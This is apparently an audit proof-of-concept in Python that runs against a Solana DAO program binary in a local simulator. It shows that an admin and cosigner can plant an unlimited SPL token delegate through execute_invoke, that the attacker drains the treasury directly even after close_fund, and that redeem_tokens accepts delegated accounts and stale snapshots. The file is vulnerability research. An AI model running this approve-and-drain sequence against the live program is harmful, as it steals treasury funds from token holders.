"""TR-3 PoC: close_fund does not neutralize pre-installed SPL delegations, and
redeem_tokens neither rejects delegated/close-authority treasury accounts nor
caps payouts at the live balance.

Runs against the ORIGINAL evidence/mainnet.so only. Three independent demos:

  A. execute_invoke performs an SPL-Token Approve on the wallet's funding ATA,
     delegating u64::MAX to an attacker. (admin + cosigner, fund still open.)
  B. The attacker then drains the ATA with a DIRECT Token TransferChecked as the
     delegate -- no dao_v1 instruction involved. This is exactly what still works
     after close_fund, because close_fund only makes execute_invoke refuse to run;
     it cannot revoke an existing delegate.
  C. redeem_tokens succeeds against a treasury token account that carries a live
     delegate AND a close_authority (no delegate.is_none()/close_authority.is_none()
     constraint), and because the redemption snapshot is taken lazily and never
     re-checked against the live balance, once the balance is below the snapshot a
     later claim computes a payout from the stale snapshot and reverts, stranding
     late redeemers.
"""
import sys, pathlib, json, base64, hashlib, struct
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[2] / 'scripts'))
from differential import (ROOT, PROGRAM, Account, AccountMeta, Instruction, Keypair,
                          LiteSVM, Message, Pubkey, Transaction)
from differential_burn import TOKEN, ATA

ORIG = ROOT / 'evidence' / 'mainnet.so'

def bal(vm, acc):
    return struct.unpack('<Q', bytes(vm.get_account(acc).data[64:72]))[0]

def demo_AB(binary):
    """Pre-arm a delegate through execute_invoke, then drain directly."""
    accounts = json.loads((ROOT/'evidence/full-account-samples.json').read_text())['accounts']
    accounts.update(json.loads((ROOT/'evidence/related-accounts.json').read_text()))
    k, a = next((k, a) for k, a in accounts.items() if a and a['space'] == 256)
    sd = bytearray(base64.b64decode(a['data'][0]))
    admin = Pubkey.from_bytes(bytes(sd[8:40])); mint = Pubkey.from_bytes(bytes(sd[40:72])); state = Pubkey.from_string(k)
    vm = LiteSVM().with_sigverify(False).with_transaction_history(0)
    vm.add_program(PROGRAM, binary.read_bytes())
    for kk, aa in accounts.items():
        if aa:
            vm.set_account(Pubkey.from_string(kk), Account(aa['lamports'], base64.b64decode(aa['data'][0]),
                Pubkey.from_string(aa['owner']), aa['executable'], aa['rentEpoch']))
    payer = Keypair.from_seed(bytes([42])*32); vm.airdrop(payer.pubkey(), 10**10)
    wallet, _ = Pubkey.find_program_address([b'wallet', bytes(mint)], PROGRAM)
    vm.set_account(wallet, Account(10**9, b'', Pubkey.default()))
    cosign = Pubkey.from_string(next(kk for kk, aa in accounts.items() if aa and aa['space'] == 41))
    cosigner = Pubkey.from_bytes(base64.b64decode(accounts[str(cosign)]['data'][0])[9:41])
    vm.set_account(cosigner, Account(10**8, b'', Pubkey.default()))
    sd[112] = 0  # fund open so execute_invoke runs
    vm.set_account(state, Account(10**8, bytes(sd).ljust(256, b'\0'), PROGRAM))

    fmint = Pubkey.from_bytes(bytes([80])*32)
    md = bytearray(82); md[36:44] = struct.pack('<Q', 10**12); md[44] = 6; md[45] = 1
    vm.set_account(fmint, Account(10**7, bytes(md), TOKEN))
    def ta(owner, amount):
        key, _ = Pubkey.find_program_address([bytes(owner), bytes(TOKEN), bytes(fmint)], ATA)
        d = bytearray(165); d[:32] = bytes(fmint); d[32:64] = bytes(owner)
        d[64:72] = struct.pack('<Q', amount); d[108] = 1
        vm.set_account(key, Account(10**7, bytes(d), TOKEN)); return key
    wallet_ata = ta(wallet, 1_000_000)          # treasury funding ATA
    attacker = Keypair.from_seed(bytes([88])*32); vm.set_account(attacker.pubkey(), Account(10**8, b'', Pubkey.default()))
    attacker_ata = ta(attacker.pubkey(), 0)

    # A: execute_invoke -> SPL Approve(u64::MAX) with the wallet PDA as owner/authority.
    inner = bytes([4]) + struct.pack('<Q', 2**64 - 1)       # Token Approve, amount
    outer = [AccountMeta(admin, True, True), AccountMeta(mint, False, False), AccountMeta(state, False, True),
             AccountMeta(wallet, False, True), AccountMeta(TOKEN, False, False),
             AccountMeta(cosigner, True, False), AccountMeta(cosign, False, False)]
    remaining = [AccountMeta(wallet_ata, False, True), AccountMeta(attacker.pubkey(), False, False),
                 AccountMeta(wallet, False, True)]   # owner = wallet (forwarded signer)
    data = hashlib.sha256(b'global:execute_invoke').digest()[:8] + struct.pack('<I', len(inner)) + inner
    ix = Instruction(PROGRAM, data, outer + remaining)
    tx = Transaction.new_unsigned(Message.new_with_blockhash([ix], payer.pubkey(), vm.latest_blockhash()))
    r_approve = json.loads(vm.send_transaction(tx).to_json())

    # Simulate the irreversible close_fund: flip admin_closed_fund. (execute_invoke now dead.)
    sd2 = bytearray(vm.get_account(state).data); sd2[112] = 1
    vm.set_account(state, Account(vm.get_account(state).lamports, bytes(sd2), PROGRAM))

    # B: attacker drains the treasury ATA with a DIRECT Token TransferChecked as delegate.
    drain = bytes([12]) + struct.pack('<Q', 1_000_000) + bytes([6])
    dmetas = [AccountMeta(wallet_ata, False, True), AccountMeta(fmint, False, False),
              AccountMeta(attacker_ata, False, True), AccountMeta(attacker.pubkey(), True, False)]
    dix = Instruction(TOKEN, drain, dmetas)
    dtx = Transaction.new_unsigned(Message.new_with_blockhash([dix], payer.pubkey(), vm.latest_blockhash()))
    r_drain = json.loads(vm.send_transaction(dtx).to_json())
    return {'approve_err': r_approve.get('err'), 'drain_err': r_drain.get('err'),
            'treasury_after': bal(vm, wallet_ata), 'attacker_after': bal(vm, attacker_ata)}

def demo_C(binary, case):
    """redeem_tokens with a delegated+close-authority treasury account / stale snapshot."""
    payer = Keypair.from_seed(bytes([42])*32); mint = Pubkey.from_bytes(bytes([50])*32)
    redeem_mint = Pubkey.from_bytes(bytes([51])*32); wallet, _ = Pubkey.find_program_address([b'wallet', bytes(mint)], PROGRAM)
    vm = LiteSVM(); vm.add_program(PROGRAM, binary.read_bytes()); vm.airdrop(payer.pubkey(), 10**10)
    vm.set_account(wallet, Account(10**9, b'', Pubkey.default()))
    for m in [mint, redeem_mint]:
        md = bytearray(82); md[36:44] = struct.pack('<Q', case.get('supply', 1000)); md[44] = 6; md[45] = 1
        vm.set_account(m, Account(10**7, bytes(md), TOKEN))
    key, _ = Pubkey.find_program_address([bytes(wallet), bytes(TOKEN), bytes(redeem_mint)], ATA)
    d = bytearray(165); d[:32] = bytes(redeem_mint); d[32:64] = bytes(wallet)
    d[64:72] = struct.pack('<Q', case.get('balance', 1_000_000)); d[108] = 1
    if case.get('delegated'):
        d[72:76] = struct.pack('<I', 1); d[76:108] = bytes([91])*32           # delegate COption = Some(0x5b..)
        d[121:129] = struct.pack('<Q', 2**64 - 1)                              # delegated_amount
    if case.get('close_auth'):
        d[129:133] = struct.pack('<I', 1); d[133:165] = bytes([92])*32         # close_authority COption = Some
    vm.set_account(key, Account(10**7, bytes(d), TOKEN)); source = key
    dest_key, _ = Pubkey.find_program_address([bytes(payer.pubkey()), bytes(TOKEN), bytes(redeem_mint)], ATA)
    dd = bytearray(165); dd[:32] = bytes(redeem_mint); dd[32:64] = bytes(payer.pubkey()); dd[108] = 1
    vm.set_account(dest_key, Account(10**7, bytes(dd), TOKEN)); dest = dest_key
    user, _ = Pubkey.find_program_address([b'user_metadata', bytes(mint), bytes(payer.pubkey())], PROGRAM)
    vm.set_account(user, Account(1002240, hashlib.sha256(b'account:UserDaoBurned').digest()[:8]+struct.pack('<Q', 100), PROGRAM))
    snapshot, _ = Pubkey.find_program_address([b'token_acc_metadata', bytes(mint), bytes(source)], PROGRAM)
    redeemed, _ = Pubkey.find_program_address([b'token_redeem', bytes(mint), bytes(source), bytes(payer.pubkey())], PROGRAM)
    if 'snapshot' in case:
        vm.set_account(snapshot, Account(1064880, hashlib.sha256(b'account:TokenAccountRedemption').digest()[:8]+bytes([1])+struct.pack('<QQ', case['snapshot'], 0), PROGRAM))
    keys = [payer.pubkey(), mint, redeem_mint, wallet, source, dest, user, snapshot, redeemed, TOKEN, Pubkey.default(), ATA]
    metas = [AccountMeta(k, i == 0, i in [0, 3, 4, 5, 6, 7, 8]) for i, k in enumerate(keys)]
    ix = Instruction(PROGRAM, hashlib.sha256(b'global:redeem_tokens').digest()[:8]+struct.pack('<Q', case.get('amount', 10)), metas)
    tx = Transaction.new_signed_with_payer([ix], payer.pubkey(), [payer], vm.latest_blockhash())
    r = json.loads(vm.send_transaction(tx).to_json())
    return {'error': r.get('err'), 'logs': r.get('meta', r).get('logs')}

def main():
    print("=== TR-3 against ORIGINAL", ORIG, "===")
    ab = demo_AB(ORIG)
    print("A: execute_invoke SPL Approve err:", ab['approve_err'])
    print("B: direct delegate drain err:", ab['drain_err'],
          "treasury_after:", ab['treasury_after'], "attacker_after:", ab['attacker_after'])
    assert ab['approve_err'] is None, "Approve via execute_invoke should succeed"
    assert ab['drain_err'] is None, "delegate drain should succeed even after close"
    assert ab['treasury_after'] == 0 and ab['attacker_after'] == 1_000_000, "treasury should be drained to attacker"

    delegated = demo_C(ORIG, {'delegated': True, 'close_auth': True, 'amount': 10, 'supply': 1000, 'balance': 1_000_000})
    print("C1: redeem against delegated+close-authority treasury acct err:", delegated['error'])
    assert delegated['error'] is None, "redeem_tokens should (wrongly) accept a delegated/close-auth account"

    stale = demo_C(ORIG, {'snapshot': 1_000_000, 'balance': 1, 'amount': 10, 'supply': 1000})
    print("C2: redeem with stale snapshot (snapshot=1e6, live=1) err:", stale['error'])
    assert stale['error'] is not None, "late redeemer should revert when live balance < snapshot-derived payout"

    print("=> close_fund cannot revoke a pre-armed delegate (A+B); redeem_tokens")
    print("   neither rejects delegated/close-authority treasury accounts nor caps")
    print("   payouts at the live balance (C). TR-3 CONFIRMED on original.")

if __name__ == '__main__':
    main()
